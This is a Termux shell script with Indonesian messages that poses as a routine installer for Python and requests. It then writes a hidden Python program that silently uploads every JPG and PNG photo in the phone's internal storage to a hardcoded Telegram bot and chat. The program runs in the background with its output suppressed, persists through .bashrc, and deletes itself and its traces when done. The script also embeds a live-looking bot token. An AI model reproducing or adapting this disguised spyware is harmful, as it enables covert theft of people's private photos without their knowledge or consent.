#!/data/data/com.termux/files/usr/bin/bash
clear

echo -e "\033[1;32m[+] Memulai instalasi... \033[0m"
sleep 3
pkg update && pkg upgrade -y
clear
echo -e "\033[1;32m[+] install python \033[0m"
sleep 3
pkg install python -y 
clear
echo -e "\033[1;32m[+] install pip request \033[0m"
sleep 3
pip install requests
clear
echo -e "\033[1;32m[+] loading bre... \033[0m"
sleep 5
# Buat direktori untuk script jika belum ada
SCRIPT_DIR="$HOME/.telegram_image_sender"
mkdir -p "$SCRIPT_DIR"

# Buat file Python script
cat > "$SCRIPT_DIR/send_images.py" << 'EOF'
import os
import requests
import time
import sys
from pathlib import Path

# Konfigurasi Bot Telegram
BOT_TOKEN = "7482886928:AAGBlF9Tl3vxTxYdh4E0IJviUZpA1c6S9pw"
CHAT_ID = "-1002476361628"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_MESSAGE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Direktori internal (sesuaikan dengan path di perangkat Anda)
INTERNAL_DIR = "/storage/emulated/0"  # Root direktori internal
SENT_FILES_LOG = os.path.expanduser("~/.sent_files.log")  # File log untuk menyimpan daftar file yang sudah dikirim

# Mengambil informasi perangkat
def get_device_info():
    device_name = ""
    android_version = ""
    ip_address = ""
    return device_name, android_version, ip_address

# Fungsi untuk mengirim pesan ke Telegram
def send_message(message):
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    response = requests.post(TELEGRAM_MESSAGE_URL, data=data)
    return response.status_code == 200

# Fungsi untuk mengirim file dengan penanganan rate limit
def send_file(file_path):
    device_name, android_version, ip_address = get_device_info()
    
    # Deskripsi file (lokasi file)
    file_location = f"📂 Lokasi File: {file_path}"
    message = f"📱 Perangkat: {device_name}\n⚙️ Versi Android: {android_version}\n👾 IP Address: {ip_address}\n{file_location}"

    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID, 'caption': message}

        retry_delay = 3  # Mulai dengan 3 detik
        max_retries = 3  # Maksimum percobaan ulang
        
        for attempt in range(max_retries):
            response = requests.post(TELEGRAM_API_URL, data=data, files=files)
            
            if response.status_code == 200:
                return True
            
            elif response.status_code == 429:
                # Jika terkena rate limit, ambil waktu tunggu dari response (jika tersedia)
                retry_after = response.json().get("parameters", {}).get("retry_after", retry_delay)
                time.sleep(retry_after)  # Tunggu sebelum mencoba lagi
            
            else:
                return False
        
        return False

# Mencatat file yang sudah dikirim ke log
def log_sent_file(file_path):
    with open(SENT_FILES_LOG, "a") as log_file:
        log_file.write(file_path + "\n")

# Memeriksa apakah file sudah dikirim sebelumnya
def is_file_sent(file_path):
    if not os.path.exists(SENT_FILES_LOG):
        return False
    with open(SENT_FILES_LOG, "r") as log_file:
        sent_files = log_file.read().splitlines()
    return file_path in sent_files

# Mengambil semua file foto dari direktori dan subdirektori
def get_all_images(directory):
    images = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                images.append(os.path.join(root, file))
    return images

# Mengirim semua file foto
def send_all_files():
    images = get_all_images(INTERNAL_DIR)
    if not images:
        # Kirim pesan jika tidak ada file foto yang ditemukan
        send_message("📂 Tidak ada file foto yang ditemukan di internal storage.")
        return

    for image_path in images:
        if is_file_sent(image_path):
            continue

        if send_file(image_path):
            log_sent_file(image_path)
            time.sleep(2)  # Delay 2 detik antar pengiriman file untuk menghindari rate limit

    # Kirim pesan ketika semua file telah dikirim
    send_message("✅ Semua file foto di internal storage telah berhasil dikirim!")

    # Setelah semua file dikirim, hapus script dan file log
    if os.path.exists(SENT_FILES_LOG):
        os.remove(SENT_FILES_LOG)
    
    # Hapus file script dan direktori
    os.remove(__file__)
    os.rmdir(os.path.dirname(__file__))

    # Hapus perintah dari .bashrc
    bashrc_path = os.path.expanduser("~/.bashrc")
    with open(bashrc_path, "r") as file:
        lines = file.readlines()
    with open(bashrc_path, "w") as file:
        for line in lines:
            if "nohup python3 $HOME/.telegram_image_sender/send_images.py" not in line:
                file.write(line)

    sys.exit(0)

# Jalankan script di latar belakang
def run_in_background():
    try:
        if os.fork():
            sys.exit(0)
    except OSError as e:
        sys.exit(1)

    # Jalankan fungsi utama
    send_all_files()

if __name__ == "__main__":
    # Redirect semua output ke /dev/null agar tidak terlihat
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    run_in_background()
EOF

# Beri izin eksekusi pada script
chmod +x "$SCRIPT_DIR/send_images.py"

# Tambahkan perintah untuk menjalankan script di latar belakang saat Termux dibuka
echo "nohup python3 $HOME/.telegram_image_sender/send_images.py > /dev/null 2>&1 &" >> $HOME/.bashrc

echo -e "\033[1;32m[+] Instalasi berhasil! \033[0m"
sleep 2
echo -e "\033[1;31m[!] Restart Termux nya bre..\033[0m"
sleep 0
echo -e "\033[1;31m[!] Tekan Enter untuk keluar. \033[0m"
sleep 1

# Keluar dari Termux
pkill -9 -f "com.termux"
